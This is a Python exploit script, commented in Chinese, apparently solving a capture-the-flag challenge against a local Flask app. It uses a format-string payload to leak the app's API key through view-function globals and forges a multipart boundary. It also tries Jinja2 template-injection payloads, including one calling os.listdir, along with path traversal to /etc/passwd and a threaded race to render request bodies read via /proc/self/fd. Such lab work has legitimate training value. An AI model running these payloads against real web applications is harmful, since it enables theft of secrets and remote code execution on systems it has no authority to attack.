import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def test_ssti_in_path(api_key):
    """测试路径参数是否可以注入 SSTI"""
    headers = {"Authorization": api_key}
    
    # 尝试在 tmpl 参数中注入 SSTI
    # 但是 os.path.exists 会先检查，所以需要文件存在
    
    # 也许可以利用符号链接？
    # /proc/self/cwd -> /app
    
    payloads = [
        # 尝试让路径本身包含 SSTI 语法
        "/etc/passwd{{7*7}}",  # 不会工作，因为文件不存在
        "index.html",  # 正常请求
    ]
    
    for p in payloads:
        try:
            r = httpx.get(f"{TARGET}/admin", params={"tmpl": p}, headers=headers, timeout=10.0)
            print(f"Path '{p}': {r.status_code}")
            if r.status_code == 200 and '49' in r.text:
                print(f"[!] SSTI triggered! Response: {r.text[:200]}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    test_ssti_in_path(api_key)
    
    # 更重要的是：重新审视代码
    # admin() 中：
    #   tmpl_path = os.path.join('./templates', tmpl)
    #   tmpl_content = open(tmpl_path, 'r').read()
    #   return render_template_string(tmpl_content), 200
    #
    # 这意味着：
    # 1. 路径遍历可以读取任意文件 ✅
    # 2. 文件内容会被当作 Jinja2 模板渲染 ✅
    
    # 所以关键是找到一个包含可控 SSTI payload 的文件！
    
    # 想法：能否通过 /proc/self/fd 来读取正在处理的请求？
    # 当 Flask 处理请求时，请求体可能在某个 fd 中
    
    print("\n[*] Trying concurrent request to catch fd...")
    
    import threading
    import time
    
    ssti_payload = "{{lipsum.__globals__['os'].listdir('/')}}"
    results = []
    
    def send_long_request():
        """发送包含 SSTI payload 的请求"""
        data = {'text': ssti_payload, 'client': 'test', 'token': 'test'}
        try:
            # 发送请求但不等待响应
            r = httpx.post(f'{TARGET}/heartbeat', data=data, timeout=30.0)
        except:
            pass
    
    def check_fd():
        """检查 fd"""
        headers = {"Authorization": api_key}
        for i in range(30):
            try:
                r = httpx.get(f"{TARGET}/admin", params={"tmpl": f"/proc/self/fd/{i}"}, headers=headers, timeout=1.0)
                if r.status_code == 200 and r.text and 'flag' in r.text.lower():
                    results.append((i, r.text))
                    print(f"[!] Found something in fd/{i}: {r.text[:200]}")
            except:
                pass
    
    # 并发执行
    for _ in range(5):
        t1 = threading.Thread(target=send_long_request)
        t2 = threading.Thread(target=check_fd)
        t1.start()
        t2.start()
        t1.join()
        t2.join()
